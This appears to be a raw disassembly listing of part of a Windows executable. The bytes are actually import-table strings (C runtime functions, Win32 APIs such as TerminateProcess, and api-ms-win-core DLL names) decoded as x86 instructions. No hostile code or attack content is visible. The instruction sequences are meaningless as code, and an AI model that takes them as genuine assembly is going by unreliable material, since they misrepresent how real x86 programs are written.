  408570:	ins    BYTE PTR es:[edi],dx
  408571:	ins    BYTE PTR es:[edi],dx
  408572:	outs   dx,DWORD PTR ds:[esi]
  408573:	arpl   WORD PTR [eax],ax
  408575:	add    BYTE PTR [edx],cl
  408577:	add    eax,0x636d656d
  40857c:	jo     0x4085f7
  40857e:	pop    edi
  40857f:	jae    0x408581
  408581:	add    BYTE PTR ds:0x6d656d05,cl
  408587:	jae    0x4085ee
  408589:	je     0x40858b
  40858b:	add    BYTE PTR [eax+eax*1],cl
  40858e:	aas    
  40858f:	aas    
  408590:	xor    BYTE PTR [ebp+0x78],ah
  408593:	arpl   WORD PTR [ebp+0x70],sp
  408596:	je     0x408601
  408598:	outs   dx,DWORD PTR ds:[esi]
  408599:	outs   dx,BYTE PTR ds:[esi]
  40859a:	inc    eax
  40859b:	inc    eax
  40859c:	push   ecx
  40859d:	inc    ecx
  40859e:	inc    ebp
  40859f:	inc    eax
  4085a0:	pop    eax
  4085a1:	pop    edx
  4085a2:	add    BYTE PTR [eax],al
  4085a4:	or     eax,DWORD PTR [eax]
  4085a6:	aas    
  4085a7:	aas    
  4085a8:	xor    BYTE PTR [ebp+0x78],ah
  4085ab:	arpl   WORD PTR [ebp+0x70],sp
  4085ae:	je     0x408619
  4085b0:	outs   dx,DWORD PTR ds:[esi]
  4085b1:	outs   dx,BYTE PTR ds:[esi]
  4085b2:	inc    eax
  4085b3:	inc    eax
  4085b4:	push   ecx
  4085b5:	inc    ecx
  4085b6:	inc    ebp
  4085b7:	inc    eax
  4085b8:	inc    ecx
  4085b9:	inc    edx
  4085ba:	push   esi
  4085bb:	xor    BYTE PTR [eax+0x40],al
  4085be:	pop    edx
  4085bf:	add    BYTE PTR [eax],dl
  4085c1:	add    BYTE PTR [edi],bh
  4085c3:	aas    
  4085c4:	xor    DWORD PTR [ebp+0x78],esp
  4085c7:	arpl   WORD PTR [ebp+0x70],sp
  4085ca:	je     0x408635
  4085cc:	outs   dx,DWORD PTR ds:[esi]
  4085cd:	outs   dx,BYTE PTR ds:[esi]
  4085ce:	inc    eax
  4085cf:	inc    eax
  4085d0:	push   ebp
  4085d1:	inc    ecx
  4085d2:	inc    ebp
  4085d3:	inc    eax
  4085d4:	pop    eax
  4085d5:	pop    edx
  4085d6:	add    BYTE PTR [eax],al
  4085d8:	aaa    
  4085d9:	add    BYTE PTR [edi],bh
  4085db:	ja     0x408645
  4085dd:	popa   
  4085de:	je     0x408620
  4085e0:	gs js  0x408646
  4085e3:	gs jo  0x40865a
  4085e6:	imul   ebp,DWORD PTR [edi+0x6e],0x42554040
  4085ed:	inc    ebp
  4085ee:	push   eax
  4085ef:	inc    edx
  4085f0:	inc    esp
  4085f1:	pop    eax
  4085f2:	pop    edx
  4085f3:	add    BYTE PTR [edx],ah
  4085f5:	add    DWORD PTR [edi+0x63],ebx
  4085f8:	popa   
  4085f9:	ins    BYTE PTR es:[edi],dx
  4085fa:	ins    BYTE PTR es:[edi],dx
  4085fb:	outs   dx,BYTE PTR ds:[esi]
  4085fc:	gs ja  0x408667
  4085ff:	add    BYTE PTR [eax+eax*1+0x5f],ah
  408603:	inc    ebx
  408604:	js     0x40867e
  408606:	push   esp
  408607:	push   0x45776f72
  40860c:	js     0x408671
  40860e:	gs jo  0x408685
  408611:	imul   ebp,DWORD PTR [edi+0x6e],0x6f0000
  408618:	pop    edi
  408619:	pop    eax
  40861a:	arpl   WORD PTR [eax+0x74],si
  40861d:	inc    esi
  40861e:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0xc90072
  408626:	pop    edi
  408627:	pop    edi
  408628:	jo     0x408689
  40862a:	pop    edi
  40862b:	arpl   WORD PTR [edi+0x6d],bp
  40862e:	ins    DWORD PTR es:[edi],dx
  40862f:	outs   dx,DWORD PTR ds:[esi]
  408630:	fs add BYTE PTR gs:[eax],al
  408634:	adc    DWORD PTR [ecx],eax
  408636:	pop    edi
  408637:	popa   
  408638:	ins    DWORD PTR es:[edi],dx
  408639:	jae    0x4086a2
  40863b:	pop    edi
  40863c:	gs js  0x4086a8
  40863f:	je     0x408641
  408641:	add    cl,dh
  408643:	add    BYTE PTR [edi+0x5f],bl
  408646:	ja     0x4086af
  408648:	gs je  0x4086b8
  40864b:	popa   
  40864c:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  408653:	add    dl,ah
  408655:	add    BYTE PTR [edi+0x5f],bl
  408658:	jae    0x4086bf
  40865a:	je     0x4086bb
  40865c:	popa   
  40865d:	jo     0x4086cf
  40865f:	pop    edi
  408660:	je     0x4086db
  408662:	jo     0x4086c9
  408664:	add    BYTE PTR [eax],al
  408666:	scas   al,BYTE PTR es:[edi]
  408667:	add    al,0x65
  408669:	js     0x4086d4
  40866b:	je     0x40866d
  40866d:	add    BYTE PTR [ebx+0x1],dh
  408670:	pop    edi
  408671:	gs js  0x4086dd
  408674:	je     0x408676
  408676:	and    al,0x1
  408678:	pop    edi
  408679:	arpl   WORD PTR [ebp+0x78],sp
  40867c:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x5f5f00ce
  408684:	jo     0x4086e5
  408686:	pop    edi
  408687:	ins    WORD PTR es:[edi],dx
  408689:	outs   dx,DWORD PTR ds:[esi]
  40868a:	fs add BYTE PTR gs:[eax],al
  40868e:	in     al,0x0
  408690:	pop    edi
  408691:	pop    edi
  408692:	jae    0x4086f9
  408694:	je     0x40870b
  408696:	jae    0x4086fd
  408698:	jb     0x408707
  40869a:	popa   
  40869b:	je     0x408705
  40869d:	gs jb  0x408712
  4086a0:	add    BYTE PTR [eax],al
  4086a2:	call   0x6ea9e5a8
  4086a7:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x5006d72
  4086af:	add    al,0x5f
  4086b1:	ja     0x408716
  4086b3:	ins    DWORD PTR es:[edi],dx
  4086b4:	fs ins BYTE PTR es:[edi],dx
  4086b6:	outs   dx,BYTE PTR ds:[esi]
  4086b7:	add    BYTE PTR [ebp+0x73],ch
  4086ba:	jbe    0x40871f
  4086bc:	jb     0x408732
  4086be:	cs fs ins BYTE PTR es:[edi],dx
  4086c1:	ins    BYTE PTR es:[edi],dx
  4086c2:	add    BYTE PTR [eax],al
  4086c4:	xor    eax,0x65743f00
  4086c9:	jb     0x408738
  4086cb:	imul   ebp,DWORD PTR [esi+0x61],0x40406574
  4086d2:	pop    ecx
  4086d3:	inc    ecx
  4086d4:	pop    eax
  4086d5:	pop    eax
  4086d6:	pop    edx
  4086d7:	add    BYTE PTR [eax+0x2],ah
  4086da:	pop    edi
  4086db:	ins    BYTE PTR es:[edi],dx
  4086dc:	outs   dx,DWORD PTR ds:[esi]
  4086dd:	arpl   WORD PTR [ebx+0x0],bp
  4086e0:	les    eax,FWORD PTR [ebx]
  4086e2:	pop    edi
  4086e3:	jne    0x408753
  4086e5:	ins    BYTE PTR es:[edi],dx
  4086e6:	outs   dx,DWORD PTR ds:[esi]
  4086e7:	arpl   WORD PTR [ebx+0x0],bp
  4086ea:	popf   
  4086eb:	add    BYTE PTR [edi+0x5f],bl
  4086ee:	fs ins BYTE PTR es:[edi],dx
  4086f0:	ins    BYTE PTR es:[edi],dx
  4086f1:	outs   dx,DWORD PTR ds:[esi]
  4086f2:	outs   dx,BYTE PTR ds:[esi]
  4086f3:	gs js  0x40875f
  4086f6:	je     0x4086f8
  4086f8:	or     DWORD PTR [ebx],eax
  4086fa:	pop    edi
  4086fb:	outs   dx,DWORD PTR ds:[esi]
  4086fc:	outs   dx,BYTE PTR ds:[esi]
  4086fd:	gs js  0x408769
  408700:	je     0x408702
  408702:	add    DWORD PTR [bx+0x65],ebx
  408706:	jb     0x40877a
  408708:	outs   dx,BYTE PTR ds:[esi]
  408709:	outs   dx,DWORD PTR ds:[esi]
  40870a:	add    BYTE PTR [eax],al
  40870c:	push   ds
  40870d:	add    eax,0x6c616572
  408712:	ins    BYTE PTR es:[edi],dx
  408713:	outs   dx,DWORD PTR ds:[esi]
  408714:	arpl   WORD PTR [eax],ax
  408716:	adc    DWORD PTR [eax],eax
  408718:	aas    
  408719:	aas    
  40871a:	xor    DWORD PTR [ecx+edi*2+0x70],esi
  40871e:	gs pop edi
  408720:	imul   ebp,DWORD PTR [esi+0x66],0x5540406f
  408727:	inc    ecx
  408728:	inc    ebp
  408729:	inc    eax
  40872a:	pop    eax
  40872b:	pop    edx
  40872c:	add    BYTE PTR [eax],al
  40872e:	aaa    
  40872f:	add    DWORD PTR [edi+0x63],ebx
  408732:	outs   dx,DWORD PTR ds:[esi]
  408733:	outs   dx,BYTE PTR ds:[esi]
  408734:	je     0x4087a8
  408736:	outs   dx,DWORD PTR ds:[esi]
  408737:	ins    BYTE PTR es:[edi],dx
  408738:	data16 jo 0x40873b
  40873b:	add    BYTE PTR [edx+0x1],ch
  40873e:	pop    edi
  40873f:	gs js  0x4087a5
  408742:	gs jo  0x4087b9
  408745:	pop    edi
  408746:	push   0x6c646e61
  40874b:	gs jb  0x408782
  40874e:	pop    edi
  40874f:	arpl   WORD PTR [edi+0x6d],bp
  408752:	ins    DWORD PTR es:[edi],dx
  408753:	outs   dx,DWORD PTR ds:[esi]
  408754:	outs   dx,BYTE PTR ds:[esi]
  408755:	add    BYTE PTR [eax],cl
  408757:	add    BYTE PTR [ebx+0x6f],al
  40875a:	inc    ebx
  40875b:	jb     0x4087c2
  40875d:	popa   
  40875e:	je     0x4087c5
  408760:	dec    ecx
  408761:	outs   dx,BYTE PTR ds:[esi]
  408762:	jae    0x4087d8
  408764:	popa   
  408765:	outs   dx,BYTE PTR ds:[esi]
  408766:	arpl   WORD PTR [ebp+0x0],sp
  408769:	add    BYTE PTR ds:0x61725400,al
  40876f:	arpl   WORD PTR [ebp+0x4d],sp
  408772:	gs jae 0x4087e8
  408775:	popa   
  408776:	add    BYTE PTR gs:[bx+si],al
  40877a:	or     BYTE PTR [eax],al
  40877c:	inc    esi
  40877d:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  408784:	jne    0x4087f8
  408786:	arpl   WORD PTR [ebp+0x45],sp
  408789:	js     0x4087e2
  40878b:	add    BYTE PTR [ebx],cl
  40878d:	add    BYTE PTR [esi+0x72],al
  408790:	gs gs dec esp
  408793:	imul   esp,DWORD PTR [edx+0x72],0x797261
  40879a:	sbb    DWORD PTR [eax],eax
  40879c:	dec    esp
  40879d:	outs   dx,DWORD PTR ds:[esi]
  40879e:	popa   
  40879f:	fs push edx
  4087a1:	gs jae 0x408813
  4087a4:	jne    0x408818
  4087a6:	arpl   WORD PTR [ebp+0x0],sp
  4087a9:	add    BYTE PTR [edi],dl
  4087ab:	add    BYTE PTR [edi+ebp*2+0x61],cl
  4087af:	fs dec esp
  4087b1:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  4087b8:	js     0x408811
  4087ba:	add    BYTE PTR [eax],al
  4087bc:	inc    eax
  4087bd:	add    BYTE PTR [ebx+0x6f],al
  4087c0:	push   esp
  4087c1:	popa   
  4087c2:	jae    0x40882f
  4087c4:	dec    ebp
  4087c5:	gs ins DWORD PTR es:[edi],dx
  4087c7:	push   edx
  4087c8:	gs popa 
  4087ca:	ins    BYTE PTR es:[edi],dx
  4087cb:	ins    BYTE PTR es:[edi],dx
  4087cc:	outs   dx,DWORD PTR ds:[esi]
  4087cd:	arpl   WORD PTR [eax],ax
  4087cf:	add    BYTE PTR [ebx],dl
  4087d1:	add    BYTE PTR [edi+0x65],al
  4087d4:	je     0x408823
  4087d6:	outs   dx,DWORD PTR ds:[esi]
  4087d7:	fs jne 0x408846
  4087da:	gs dec eax
  4087dc:	popa   
  4087dd:	outs   dx,BYTE PTR ds:[esi]
  4087de:	fs ins BYTE PTR es:[edi],dx
  4087e0:	gs push edi
  4087e2:	add    BYTE PTR [eax],al
  4087e4:	add    eax,DWORD PTR [eax]
  4087e6:	push   edx
  4087e7:	gs addr16 inc ebx
  4087ea:	jb     0x408851
  4087ec:	popa   
  4087ed:	je     0x408854
  4087ef:	dec    ebx
  4087f0:	gs jns 0x408838
  4087f3:	js     0x40884c
  4087f5:	add    BYTE PTR [eax],al
  4087f7:	add    BYTE PTR [edi+0x65],al
  4087fa:	je     0x408850
  4087fc:	jb     0x40885f
  4087fe:	arpl   WORD PTR [ebp+0x45],sp
  408801:	outs   dx,BYTE PTR ds:[esi]
  408802:	popa   
  408803:	bound  ebp,QWORD PTR [ebp+eiz*2+0x46]
  408807:	ins    BYTE PTR es:[edi],dx
  408808:	popa   
  408809:	addr16 jae 0x40880c
  40880c:	sbb    BYTE PTR [eax],al
  40880e:	dec    ecx
  40880f:	outs   dx,BYTE PTR ds:[esi]
  408810:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  408818:	inc    ebx
  408819:	jb     0x408884
  40881b:	je     0x408886
  40881d:	arpl   WORD PTR [ecx+0x6c],sp
  408820:	push   ebx
  408821:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  408826:	outs   dx,BYTE PTR ds:[esi]
  408827:	add    BYTE PTR [edi],al
  408829:	add    BYTE PTR [edi+0x69],dl
  40882c:	fs gs inc ebx
  40882f:	push   0x6f547261
  408834:	dec    ebp
  408835:	jne    0x4088a3
  408837:	je     0x4088a2
  408839:	inc    edx
  40883a:	jns    0x4088b0
  40883c:	add    BYTE PTR gs:[ecx],ah
  40883f:	add    BYTE PTR [edx+0x65],dl
  408842:	addr16 push ecx
  408844:	jne    0x4088ab
  408846:	jb     0x4088c1
  408848:	dec    ecx
  408849:	outs   dx,BYTE PTR ds:[esi]
  40884a:	outs   dx,WORD PTR ds:[esi]
  40884c:	dec    ebx
  40884d:	gs jns 0x4088a7
  408850:	add    BYTE PTR [eax],al
  408852:	pop    ds
  408853:	add    BYTE PTR [ebx+0x69],dl
  408856:	jp     0x4088bd
  408858:	outs   dx,DWORD PTR ds:[esi]
  408859:	push   dx
  40885b:	gs jae 0x4088cd
  40885e:	jne    0x4088d2
  408860:	arpl   WORD PTR [ebp+0x0],sp
  408863:	add    BYTE PTR [eax],cl
  408865:	add    BYTE PTR [esi+0x6f],al
  408868:	jb     0x4088d7
  40886a:	popa   
  40886b:	je     0x4088ba
  40886d:	gs jae 0x4088e3
  408870:	popa   
  408871:	addr16 gs push edi
  408874:	add    BYTE PTR [eax],al
  408876:	sbb    eax,0x61654c00
  40887b:	jbe    0x4088e2
  40887d:	inc    ebx
  40887e:	jb     0x4088e9
  408880:	je     0x4088eb
  408882:	arpl   WORD PTR [ecx+0x6c],sp
  408885:	push   ebx
  408886:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40888b:	outs   dx,BYTE PTR ds:[esi]
  40888c:	add    BYTE PTR [eax],al
  40888e:	add    al,BYTE PTR [eax]
  408890:	inc    edi
  408891:	gs je  0x4088e8
  408894:	jb     0x4088f7
  408896:	arpl   WORD PTR [ebp+0x4c],sp
  408899:	outs   dx,DWORD PTR ds:[esi]
  40889a:	addr16 addr16 gs jb 0x4088e7
  40889f:	popa   
  4088a0:	outs   dx,BYTE PTR ds:[esi]
  4088a1:	fs ins BYTE PTR es:[edi],dx
  4088a3:	add    BYTE PTR gs:[eax],al
  4088a6:	sldt   WORD PTR [edi+0x65]
  4088aa:	je     0x4088f9
  4088ac:	outs   dx,DWORD PTR ds:[esi]
  4088ad:	fs jne 0x40891c
  4088b0:	gs inc esi
  4088b2:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  4088ba:	add    BYTE PTR [eax],al
  4088bc:	push   es
  4088bd:	add    BYTE PTR [ebp+0x75],cl
  4088c0:	ins    BYTE PTR es:[edi],dx
  4088c1:	je     0x40892c
  4088c3:	inc    edx
  4088c4:	jns    0x40893a
  4088c6:	gs push esp
  4088c8:	outs   dx,DWORD PTR ds:[esi]
  4088c9:	push   edi
  4088ca:	imul   esp,DWORD PTR [ebp+eiz*2+0x43],0x726168
  4088d2:	pop    es
  4088d3:	add    BYTE PTR [edx+0x61],dl
  4088d6:	imul   esi,DWORD PTR [ebx+0x65],0x65637845
  4088dd:	jo     0x408953
  4088df:	imul   ebp,DWORD PTR [edi+0x6e],0x50000
  4088e6:	inc    edi
  4088e7:	gs je  0x408936
  4088ea:	popa   
  4088eb:	jae    0x408961
  4088ed:	inc    ebp
  4088ee:	jb     0x408962
  4088f0:	outs   dx,DWORD PTR ds:[esi]
  4088f1:	jb     0x4088f3
  4088f3:	add    BYTE PTR ds:0x74655300,cl
  4088f9:	dec    esp
  4088fa:	popa   
  4088fb:	jae    0x408971
  4088fd:	inc    ebp
  4088fe:	jb     0x408972
  408900:	outs   dx,DWORD PTR ds:[esi]
  408901:	jb     0x408903
  408903:	add    BYTE PTR [eax+eax*1],dl
  408906:	inc    edi
  408907:	gs je  0x40895a
  40890a:	jb     0x40897b
  40890c:	arpl   WORD PTR [ecx+0x64],ax
  40890f:	fs jb  0x408977
  408912:	jae    0x408987
  408914:	add    BYTE PTR [eax],al
  408916:	or     eax,DWORD PTR [eax]
  408918:	push   edx
  408919:	gs addr16 inc esp
  40891c:	gs ins BYTE PTR es:[edi],dx
  40891e:	gs je  0x408986
  408921:	push   esi
  408922:	popa   
  408923:	ins    BYTE PTR es:[edi],dx
  408924:	jne    0x40898b
  408926:	push   edi
  408927:	add    BYTE PTR [ecx],dl
  408929:	add    BYTE PTR [ebp+0x6e],al
  40892c:	je     0x408993
  40892e:	jb     0x408973
  408930:	jb     0x40899b
  408932:	je     0x40899d
  408934:	arpl   WORD PTR [ecx+0x6c],sp
  408937:	push   ebx
  408938:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40893d:	outs   dx,BYTE PTR ds:[esi]
  40893e:	add    BYTE PTR [eax],al
  408940:	pop    es
  408941:	add    BYTE PTR [ebp+0x6e],dl
  408944:	jb     0x4089ab
  408946:	imul   esi,DWORD PTR [bp+di+0x74],0x72547265
  40894e:	popa   
  40894f:	arpl   WORD PTR [ebp+0x47],sp
  408952:	jne    0x4089bd
  408954:	fs jae 0x408957
  408957:	add    BYTE PTR [edi],bh
  408959:	add    BYTE PTR [ebx+0x6f],al
  40895c:	push   esp
  40895d:	popa   
  40895e:	jae    0x4089cb
  408960:	dec    ebp
  408961:	gs ins DWORD PTR es:[edi],dx
  408963:	inc    esi
  408964:	jb     0x4089cb
  408966:	add    BYTE PTR gs:[esi],bl
  408969:	add    BYTE PTR [edx+0x65],dl
  40896c:	addr16 dec edi
  40896e:	jo     0x4089d5
  408970:	outs   dx,BYTE PTR ds:[esi]
  408971:	dec    ebx
  408972:	gs jns 0x4089ba
  408975:	js     0x4089ce
  408977:	add    BYTE PTR [esi],bh
  408979:	add    BYTE PTR [ebx+0x6f],al
  40897c:	push   esp
  40897d:	popa   
  40897e:	jae    0x4089eb
  408980:	dec    ebp
  408981:	gs ins DWORD PTR es:[edi],dx
  408983:	inc    ecx
  408984:	ins    BYTE PTR es:[edi],dx
  408985:	ins    BYTE PTR es:[edi],dx
  408986:	outs   dx,DWORD PTR ds:[esi]
  408987:	arpl   WORD PTR [eax],ax
  408989:	add    BYTE PTR [edx],al
  40898b:	add    BYTE PTR [ebx+0x68],al
  40898e:	popa   
  40898f:	jb     0x4089df
  408991:	gs js  0x408a08
  408994:	push   edi
  408995:	add    BYTE PTR [ecx],al
  408997:	add    BYTE PTR [edi+0x65],al
  40899a:	je     0x4089f0
  40899c:	jb     0x4089ff
  40899e:	arpl   WORD PTR [ebp+0x45],sp
  4089a1:	outs   dx,BYTE PTR ds:[esi]
  4089a2:	popa   
  4089a3:	bound  ebp,QWORD PTR [ebp+eiz*2+0x4c]
  4089a7:	gs jbe 0x408a0f
  4089aa:	ins    BYTE PTR es:[edi],dx
  4089ab:	add    BYTE PTR [esi],cl
  4089ad:	add    BYTE PTR [edx+0x65],dl
  4089b0:	addr16 inc ebp
  4089b2:	outs   dx,BYTE PTR ds:[esi]
  4089b3:	jne    0x408a22
  4089b5:	dec    ebx
  4089b6:	gs jns 0x4089fe
  4089b9:	js     0x408a12
  4089bb:	add    BYTE PTR [edi],cl
  4089bd:	add    BYTE PTR [ebp+eiz*2+0x6c],al
  4089c1:	gs je  0x408a29
  4089c4:	inc    ebx
  4089c5:	jb     0x408a30
  4089c7:	je     0x408a32
  4089c9:	arpl   WORD PTR [ecx+0x6c],sp
  4089cc:	push   ebx
  4089cd:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4089d2:	outs   dx,BYTE PTR ds:[esi]
  4089d3:	add    BYTE PTR [eax],al
  4089d5:	add    BYTE PTR [edx+0x65],dl
  4089d8:	addr16 inc ebx
  4089da:	ins    BYTE PTR es:[edi],dx
  4089db:	outs   dx,DWORD PTR ds:[esi]
  4089dc:	jae    0x408a43
  4089de:	dec    ebx
  4089df:	gs jns 0x4089e2
  4089e2:	add    eax,DWORD PTR [eax]
  4089e4:	push   edx
  4089e5:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x72547265
  4089ee:	popa   
  4089ef:	arpl   WORD PTR [ebp+0x47],sp
  4089f2:	jne    0x408a5d
  4089f4:	fs jae 0x408a4e
  4089f7:	add    BYTE PTR [eax+eax*1],ch
  4089fa:	push   edx
  4089fb:	gs addr16 push ebx
  4089fe:	gs je  0x408a57
  408a01:	popa   
  408a02:	ins    BYTE PTR es:[edi],dx
  408a03:	jne    0x408a6a
  408a05:	inc    ebp
  408a06:	js     0x408a5f
  408a08:	add    BYTE PTR [eax],al
  408a0a:	add    eax,DWORD PTR [eax]
  408a0c:	dec    esp
  408a0d:	outs   dx,DWORD PTR ds:[esi]
  408a0e:	arpl   WORD PTR [ecx+0x6c],sp
  408a11:	inc    esi
  408a12:	jb     0x408a79
  408a14:	add    BYTE PTR gs:0x656c5300,ch
  408a1b:	gs jo  0x408a1e
  408a1e:	and    BYTE PTR [eax],al
  408a20:	inc    edi
  408a21:	gs je  0x408a77
  408a24:	je     0x408a87
  408a26:	jb     0x408a9c
  408a28:	jne    0x408a9a
  408a2a:	dec    ecx
  408a2b:	outs   dx,BYTE PTR ds:[esi]
  408a2c:	outs   dx,WORD PTR ds:[esi]
  408a2e:	push   edi
  408a2f:	add    BYTE PTR [ecx],dl
  408a31:	add    BYTE PTR [ebp+0x6e],dl
  408a34:	push   0x6c646e61
  408a39:	gs fs inc ebp
  408a3c:	js     0x408aa1
  408a3e:	gs jo  0x408ab5
  408a41:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  408a48:	gs jb  0x408a4b
  408a4b:	add    BYTE PTR [edi],cl
  408a4d:	add    BYTE PTR [ebx+0x65],dl
  408a50:	je     0x408aa7
  408a52:	outs   dx,BYTE PTR ds:[esi]
  408a53:	push   0x6c646e61
  408a58:	gs fs inc ebp
  408a5b:	js     0x408ac0
  408a5d:	gs jo  0x408ad4
  408a60:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  408a67:	gs jb  0x408a6a
  408a6a:	or     al,0x0
  408a6c:	inc    edi
  408a6d:	gs je  0x408ab3
  408a70:	jne    0x408ae4
  408a72:	jb     0x408ad9
  408a74:	outs   dx,BYTE PTR ds:[esi]
  408a75:	je     0x408ac7
  408a77:	jb     0x408ae8
  408a79:	arpl   WORD PTR [ebp+0x73],sp
  408a7c:	jae    0x408a7e
  408a7e:	dec    ebx
  408a7f:	add    BYTE PTR [ebp+eiz*2+0x72],dl
  408a83:	ins    DWORD PTR es:[edi],dx
  408a84:	imul   ebp,DWORD PTR [esi+0x61],0x72506574
  408a8b:	outs   dx,DWORD PTR ds:[esi]
  408a8c:	arpl   WORD PTR [ebp+0x73],sp
  408a8f:	jae    0x408a91
  408a91:	add    BYTE PTR [eax],dl
  408a93:	add    BYTE PTR [edi+0x65],al
  408a96:	je     0x408ae5
  408a98:	outs   dx,DWORD PTR ds:[esi]
  408a99:	fs jne 0x408b08
  408a9c:	gs dec eax
  408a9e:	popa   
  408a9f:	outs   dx,BYTE PTR ds:[esi]
  408aa0:	fs ins BYTE PTR es:[edi],dx
  408aa2:	gs inc ecx
  408aa4:	add    BYTE PTR [eax],al
  408aa6:	add    BYTE PTR [eax],al
  408aa8:	push   ecx
  408aa9:	jne    0x408b10
  408aab:	jb     0x408b26
  408aad:	push   eax
  408aae:	gs jb  0x408b17
  408ab1:	outs   dx,DWORD PTR ds:[esi]
  408ab2:	jb     0x408b21
  408ab4:	popa   
  408ab5:	outs   dx,BYTE PTR ds:[esi]
  408ab6:	arpl   WORD PTR [ebp+0x43],sp
  408ab9:	outs   dx,DWORD PTR ds:[esi]
  408aba:	jne    0x408b2a
  408abc:	je     0x408b23
  408abe:	jb     0x408ac0
  408ac0:	or     eax,0x74654700
  408ac5:	inc    ebx
  408ac6:	jne    0x408b3a
  408ac8:	jb     0x408b2f
  408aca:	outs   dx,BYTE PTR ds:[esi]
  408acb:	je     0x408b1d
  408acd:	jb     0x408b3e
  408acf:	arpl   WORD PTR [ebp+0x73],sp
  408ad2:	jae    0x408b1d
  408ad4:	add    BYTE PTR fs:[ecx],dl
  408ad7:	add    BYTE PTR [edi+0x65],al
  408ada:	je     0x408b1f
  408adc:	jne    0x408b50
  408ade:	jb     0x408b45
  408ae0:	outs   dx,BYTE PTR ds:[esi]
  408ae1:	je     0x408b37
  408ae3:	push   0x64616572
  408ae8:	dec    ecx
  408ae9:	add    BYTE PTR fs:[eax],al
  408aec:	adc    al,0x0
  408aee:	inc    edi
  408aef:	gs je  0x408b45
  408af2:	jns    0x408b67
  408af4:	je     0x408b5b
  408af6:	ins    DWORD PTR es:[edi],dx
  408af7:	push   esp
  408af8:	imul   ebp,DWORD PTR [ebp+0x65],0x69467341
  408aff:	ins    BYTE PTR es:[edi],dx
  408b00:	gs push esp
  408b02:	imul   ebp,DWORD PTR [ebp+0x65],0x47001800
  408b09:	gs je  0x408b60
  408b0c:	imul   esp,DWORD PTR [ebx+0x6b],0x6e756f43
  408b13:	je     0x408b15
  408b15:	add    BYTE PTR [esi],al
  408b17:	add    BYTE PTR [edi+0x75],cl
  408b1a:	je     0x408b8c
  408b1c:	jne    0x408b92
  408b1e:	inc    esp
  408b1f:	bound  esi,QWORD PTR gs:[ebp+0x67]
  408b23:	push   ebx
  408b24:	je     0x408b98
  408b26:	imul   ebp,DWORD PTR [esi+0x67],0x61000041
  408b2d:	jo     0x408b98
  408b2f:	sub    eax,0x772d736d
  408b34:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  408b3b:	sub    eax,0x2d6d6f63
  408b40:	ins    BYTE PTR es:[edi],dx
  408b41:	xor    DWORD PTR ds:0x2e312d31,ebp
  408b47:	fs ins BYTE PTR es:[edi],dx
  408b49:	ins    BYTE PTR es:[edi],dx
  408b4a:	add    BYTE PTR [eax],al
  408b4c:	popa   
  408b4d:	jo     0x408bb8
  408b4f:	sub    eax,0x772d736d
  408b54:	imul   ebp,DWORD PTR [esi+0x2d],0x6e657665
  408b5b:	je     0x408bc6
  408b5d:	outs   dx,BYTE PTR ds:[esi]
  408b5e:	addr16 sub eax,0x73616c63
  408b64:	jae    0x408bcf
  408b66:	arpl   WORD PTR [eax+0x72],si
  408b69:	outs   dx,DWORD PTR ds:[esi]
  408b6a:	jbe    0x408bd5
  408b6c:	fs gs jb 0x408b9d
  408b70:	ins    BYTE PTR es:[edi],dx
  408b71:	xor    DWORD PTR ds:0x2e302d31,ebp
  408b77:	fs ins BYTE PTR es:[edi],dx
  408b79:	ins    BYTE PTR es:[edi],dx
  408b7a:	add    BYTE PTR [eax],al
  408b7c:	popa   
  408b7d:	jo     0x408be8
  408b7f:	sub    eax,0x772d736d
  408b84:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  408b8b:	sub    eax,0x7262696c
  408b90:	popa   
  408b91:	jb     0x408c0c
  408b93:	ins    BYTE PTR es:[edi],dx
  408b94:	outs   dx,DWORD PTR ds:[esi]
  408b95:	popa   
  408b96:	fs gs jb 0x408bc7
  408b9a:	ins    BYTE PTR es:[edi],dx
  408b9b:	xor    DWORD PTR ds:0x2e302d32,ebp
  408ba1:	fs ins BYTE PTR es:[edi],dx
  408ba3:	ins    BYTE PTR es:[edi],dx
  408ba4:	add    BYTE PTR [eax],al
  408ba6:	popa   
  408ba7:	jo     0x408c12
  408ba9:	sub    eax,0x772d736d
  408bae:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  408bb5:	sub    eax,0x69676572
  408bba:	jae    0x408c30
  408bbc:	jb     0x408c37
  408bbe:	sub    eax,0x312d316c
  408bc3:	sub    eax,0x6c642e30
  408bc8:	ins    BYTE PTR es:[edi],dx
  408bc9:	add    BYTE PTR [ecx+0x70],ah
  408bcc:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  408bd6:	outs   dx,DWORD PTR ds:[esi]
  408bd7:	jb     0x408c3e
  408bd9:	sub    eax,0x636e7973
  408bde:	push   0x2d316c2d
  408be3:	xor    ch,BYTE PTR ds:0x6c642e30
  408be9:	ins    BYTE PTR es:[edi],dx
  408bea:	add    BYTE PTR [eax],al
  408bec:	popa   
  408bed:	jo     0x408c58
  408bef:	sub    eax,0x772d736d
  408bf4:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  408bfb:	sub    eax,0x69727473
  408c00:	outs   dx,BYTE PTR ds:[esi]
  408c01:	addr16 sub eax,0x312d316c
  408c07:	sub    eax,0x6c642e30
  408c0c:	ins    BYTE PTR es:[edi],dx
  408c0d:	add    BYTE PTR [ecx+0x70],ah
  408c10:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  408c1a:	outs   dx,DWORD PTR ds:[esi]
  408c1b:	jb     0x408c82
  408c1d:	sub    eax,0x61636f6c
  408c22:	ins    BYTE PTR es:[edi],dx
  408c23:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
